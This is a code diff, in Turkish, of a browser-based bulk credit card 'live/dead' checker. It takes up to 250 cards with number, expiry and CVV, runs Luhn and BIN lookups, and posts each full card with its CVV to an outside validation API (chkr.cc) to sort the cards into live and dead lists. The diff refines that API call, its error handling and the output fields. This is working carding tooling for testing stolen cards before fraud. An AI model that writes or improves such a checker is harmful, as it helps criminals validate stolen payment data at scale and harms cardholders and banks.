@@ -51,7 +51,7 @@
     <p class="info">Max 250 Kart | Gerçek API | Luhn + BİN + Canlı/Ölü</p>
 
     <div class="input-box">
-        <textarea id="cards" placeholder="2958593949292948|02|28|392"></textarea>
+        <textarea id="cards" placeholder="4098584465601613|04|27|012"></textarea>
     </div>
     <button class="btn" onclick="startCheck()">BAŞLAT</button>
 
@@ -134,13 +134,16 @@ async function getBinInfo(bin) {
     }
 }
 
-// 2. CANLI/ÖLÜ → chkr.cc (ÜCRETSİZ, CORS, GERÇEK ZAMANLI)
+// 2. CANLI/ÖLÜ → chkr.cc (DOĞRU ENDPOINT: https://api.chkr.cc/v1/validate)
 async function checkLiveDead(cardLine) {
     const [number, month, year, cvv] = cardLine.split('|').map(s => s.trim());
     try {
         const res = await fetch('https://api.chkr.cc/v1/validate', {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
+            headers: { 
+                'Content-Type': 'application/json',
+                'User-Agent': 'DearSiberChecker/1.0'
+            },
             body: JSON.stringify({
                 card_number: number,
                 expiry_month: month,
@@ -148,14 +151,23 @@ async function checkLiveDead(cardLine) {
                 cvv: cvv
             })
         });
+
+        if (!res.ok) {
+            const err = await res.text();
+            return { valid: false, message: `HTTP ${res.status}: ${err}`, risk: "Yüksek" };
+        }
+
         const data = await res.json();
         return {
             valid: data.valid === true,
-            message: data.message || "Bilinmeyen",
-            risk: data.risk || "Bilinmeyen"
+            message: data.message || "Başarılı",
+            risk: data.risk || "Düşük",
+            bank: data.bank || "Bilinmeyen",
+            type: data.type || "Bilinmeyen",
+            country: data.country || "Bilinmeyen"
         };
     } catch (e) {
-        return { valid: false, message: "API Hatası", risk: "Yüksek" };
+        return { valid: false, message: "Bağlantı Hatası", risk: "Yüksek" };
     }
 }
 
@@ -176,10 +188,10 @@ async function checkCard(cardLine) {
     const result = {
         number, month, year, cvv,
         bin,
-        brand: binInfo?.brand || "Bilinmeyen",
-        type: binInfo?.type || "Bilinmeyen",
-        bank: binInfo?.bank || "Bilinmeyen Bank",
-        country: binInfo?.country || "Bilinmeyen",
+        brand: binInfo?.brand || chkrResult.bank || "Bilinmeyen",
+        type: binInfo?.type || chkrResult.type || "Bilinmeyen",
+        bank: binInfo?.bank || chkrResult.bank || "Bilinmeyen Bank",
+        country: binInfo?.country || chkrResult.country || "Bilinmeyen",
         flag: binInfo?.flag || "??",
         level: binInfo?.level || "Bilinmeyen",
         prepaid: binInfo?.prepaid || "Bilinmeyen",
@@ -199,14 +211,13 @@ async function checkCard(cardLine) {
 }
 
 function updateResults() {
-    // CANLI LİSTE
     const liveList = document.getElementById('live-list');
     liveList.innerHTML = '';
     liveCards.forEach(c => {
         const div = document.createElement('div');
         div.className = 'list-item';
         div.innerHTML = `<b>${c.number}</b> | ${c.month}/${c.year} | ${c.cvv}<br>
-                         ${c.brand} ${c.type} (${c.level}) | ${c.bank}<br>
+                         ${c.brand} ${c.type} | ${c.bank}<br>
                          ${c.country} ${c.flag} | Luhn: ${c.luhn} | Risk: ${c.chkrRisk}`;
         liveList.appendChild(div);
     });
@@ -214,14 +225,13 @@ function updateResults() {
     document.getElementById('live-total').textContent = liveCards.length;
     if (liveCards.length > 0) document.getElementById('live-actions').style.display = 'flex';
 
-    // ÖLÜ LİSTE
     const deadList = document.getElementById('dead-list');
     deadList.innerHTML = '';
     deadCards.forEach(c => {
         const div = document.createElement('div');
         div.className = 'list-item';
         div.innerHTML = `<b>${c.number}</b> | ${c.month}/${c.year} | ${c.cvv}<br>
-                         ${c.brand} ${c.type} (${c.level}) | ${c.bank}<br>
+                         ${c.brand} ${c.type} | ${c.bank}<br>
                          ${c.country} ${c.flag} | Luhn: ${c.luhn} | Risk: ${c.chkrRisk}`;
         deadList.appendChild(div);
     });
@@ -229,14 +239,13 @@ function updateResults() {
     document.getElementById('dead-total').textContent = deadCards.length;
     if (deadCards.length > 0) document.getElementById('dead-actions').style.display = 'flex';
 
-    // DETAYLI SONUÇLAR
     const details = document.getElementById('detailed-results');
     details.innerHTML = '';
     [...liveCards, ...deadCards].forEach(c => {
         const div = document.createElement('div');
         div.className = `result ${c.status === 'ÖLÜ' ? 'dead' : ''}`;
         div.innerHTML = `<b>${c.number}|${c.month}|${c.year}|${c.cvv}</b><br>
-                         BİN: ${c.bin} | ${c.brand} ${c.type} (${c.level}) | ${c.bank}<br>
+                         BİN: ${c.bin} | ${c.brand} ${c.type} | ${c.bank}<br>
                          ${c.country} ${c.flag} | Luhn: ${c.luhn} | CHKR: ${c.chkrValid}<br>
                          Mesaj: ${c.chkrMessage} | Risk: ${c.chkrRisk} → <b>${c.status}</b>`;
         details.appendChild(div);
@@ -281,7 +290,7 @@ async function startCheck() {
 
     for (const line of lines) {
         await checkCard(line);
-        await new Promise(r => setTimeout(r, 800)); // API limit için
+        await new Promise(r => setTimeout(r, 800)); // Rate limit
     }
 
     document.getElementById('loading').style.display = 'none';
